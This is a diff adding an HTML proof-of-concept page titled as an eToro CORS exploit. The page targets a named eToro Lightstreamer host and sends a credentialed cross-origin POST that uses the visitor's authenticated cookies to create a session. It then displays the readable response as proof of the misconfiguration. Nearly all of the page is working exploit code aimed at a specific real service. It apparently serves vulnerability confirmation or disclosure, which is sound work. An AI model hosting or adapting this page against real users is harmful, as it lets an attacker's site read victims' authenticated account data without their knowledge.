@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>eToro CORS Exploit PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        .container { max-width: 800px; margin: auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
+        pre { background: #2d2d2d; color: #ccc; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        .success { color: #28a745; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Vulnerability: Authenticated CORS Misconfiguration</h2>
+        <p><strong>Target:</strong> push-lightstreamer.cloud.etoro.com</p>
+        <p><strong>Description:</strong> This page attempts to create a Lightstreamer session using your authenticated eToro cookies. If the response below shows "Access-Control-Allow-Origin" matching this domain, the vulnerability is confirmed.</p>
+        
+        <button onclick="runExploit()">Execute Exploit</button>
+        
+        <h3>Response Headers & Data:</h3>
+        <pre id="output">Click the button to run the exploit...</pre>
+    </div>
+
+    <script>
+        function runExploit() {
+            const targetUrl = "https://push-lightstreamer.cloud.etoro.com/lightstreamer/create_session.txt";
+            const xhr = new XMLHttpRequest();
+            
+            document.getElementById("output").innerText = "Sending request...";
+
+            xhr.open("POST", targetUrl, true);
+            xhr.withCredentials = true; // Send cookies
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    const status = xhr.status;
+                    const response = xhr.responseText;
+                    // Note: In a real browser, we can't read all headers via JS unless exposed, 
+                    // but the fact the response body is readable confirms the CORS bypass.
+                    document.getElementById("output").innerText = 
+                        "Status: " + status + "\n\n" +
+                        "Response Body (Confirms Data Access):\n" + response;
+                }
+            };
+
+            xhr.send("LS_op=create&LS_cid=mgQk11&LS_adapter_set=DEMO");
+        }
+    </script>
+</body>
+</html>
